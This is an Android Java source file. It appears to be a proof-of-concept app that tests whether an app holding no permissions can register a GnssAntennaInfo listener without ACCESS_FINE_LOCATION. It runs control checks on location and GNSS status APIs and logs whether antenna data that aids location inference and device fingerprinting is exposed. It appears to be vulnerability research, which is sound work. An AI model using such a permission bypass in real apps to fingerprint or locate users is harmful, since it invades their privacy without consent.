package com.poc.gnssantennaleak;

import android.app.Activity;
import android.content.Context;
import android.location.GnssAntennaInfo;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Process;
import android.util.Log;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.view.Gravity;

import java.lang.reflect.Method;
import java.util.List;
import java.util.concurrent.Executor;

public class MainActivity extends Activity {

    private static final String TAG = "GnssAntennaLeak";
    private TextView mOutput;
    private StringBuilder mLog = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(32, 48, 32, 32);

        TextView title = new TextView(this);
        title.setText("GPS-1: GnssAntennaInfo Zero-Perm Leak");
        title.setTextSize(16);
        title.setGravity(Gravity.CENTER);
        root.addView(title);

        TextView info = new TextView(this);
        info.setText("ZERO permissions (no ACCESS_FINE_LOCATION). "
                + "Tests if GnssAntennaInfo listener registration requires location permission.");
        info.setTextSize(11);
        info.setPadding(0, 16, 0, 24);
        root.addView(info);

        ScrollView scroll = new ScrollView(this);
        mOutput = new TextView(this);
        mOutput.setTextSize(11);
        mOutput.setTypeface(android.graphics.Typeface.MONOSPACE);
        mOutput.setPadding(8, 8, 8, 8);
        scroll.addView(mOutput);
        root.addView(scroll, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1.0f));

        setContentView(root);

        log("=== GPS-1: GnssAntennaInfo Leak PoC ===");
        log("Package: " + getPackageName());
        log("UID: " + Process.myUid());
        log("Permissions: NONE (no ACCESS_FINE_LOCATION)");
        log("");

        runTests();
    }

    private void runTests() {
        LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        Executor executor = getMainExecutor();

        // Test 1: Register GnssAntennaInfo listener
        log("--- Test 1: registerAntennaInfoListener ---");
        log("Expected: SecurityException (requires ACCESS_FINE_LOCATION)");
        log("");
        try {
            GnssAntennaInfo.Listener listener = new GnssAntennaInfo.Listener() {
                @Override
                public void onGnssAntennaInfoReceived(List<GnssAntennaInfo> gnssAntennaInfos) {
                    log("[CALLBACK] Received " + gnssAntennaInfos.size() + " antenna infos!");
                    for (int i = 0; i < gnssAntennaInfos.size(); i++) {
                        GnssAntennaInfo ai = gnssAntennaInfos.get(i);
                        log("  Antenna " + i + ":");
                        log("    CarrierFrequencyMHz: " + ai.getCarrierFrequencyMHz());
                        log("    PhaseCenterOffset: " + ai.getPhaseCenterOffset());
                        log("    PhaseCenterVariationCorrections: " + ai.getPhaseCenterVariationCorrections());
                        log("    SignalGainCorrections: " + ai.getSignalGainCorrections());
                    }
                    log("  → Location-correlated data leaked WITHOUT permission!");
                }
            };

            boolean registered = lm.registerAntennaInfoListener(executor, listener);
            if (registered) {
                log("[VULN] registerAntennaInfoListener returned TRUE!");
                log("  → Registered WITHOUT ACCESS_FINE_LOCATION!");
                log("  → Waiting for antenna info callback...");
                log("  → (Callback delivers carrier freq, phase center, gain patterns)");
            } else {
                log("[INFO] registerAntennaInfoListener returned false");
                log("  → Device may not support antenna info");
            }
        } catch (SecurityException e) {
            log("[SAFE] SecurityException: " + e.getMessage());
            log("  → ACCESS_FINE_LOCATION correctly enforced");
        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        log("");

        // Test 2: Control — requestLocationUpdates should FAIL
        log("--- Control: requestLocationUpdates (should require permission) ---");
        try {
            lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 0, location -> {
                log("[UNEXPECTED] Got location: " + location);
            }, getMainLooper());
            log("[UNEXPECTED] requestLocationUpdates succeeded without permission!");
        } catch (SecurityException e) {
            log("[EXPECTED] SecurityException: " + e.getMessage());
            log("  → Location updates correctly require permission");
        } catch (Exception e) {
            log("[INFO] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        log("");

        // Test 3: Try GnssStatus listener (should also require permission)
        log("--- Control: registerGnssStatusCallback (should require permission) ---");
        try {
            boolean reg = lm.registerGnssStatusCallback(executor, new android.location.GnssStatus.Callback() {
                @Override
                public void onSatelliteStatusChanged(android.location.GnssStatus status) {
                    log("[UNEXPECTED] Got GNSS status!");
                }
            });
            if (reg) {
                log("[UNEXPECTED] GnssStatus registered without permission!");
            } else {
                log("[INFO] GnssStatus registration returned false");
            }
        } catch (SecurityException e) {
            log("[EXPECTED] SecurityException for GnssStatus");
            log("  → GnssStatus correctly requires ACCESS_FINE_LOCATION");
        } catch (Exception e) {
            log("[INFO] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        log("");
        log("=== Summary ===");
        log("If registerAntennaInfoListener succeeded without SecurityException,");
        log("antenna hardware data is accessible to zero-permission apps.");
        log("Antenna phase center and gain patterns can aid location inference");
        log("and provide persistent device hardware fingerprint.");
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        mLog.append(msg).append("\n");
        if (mOutput != null) {
            mOutput.setText(mLog.toString());
        }
    }
}
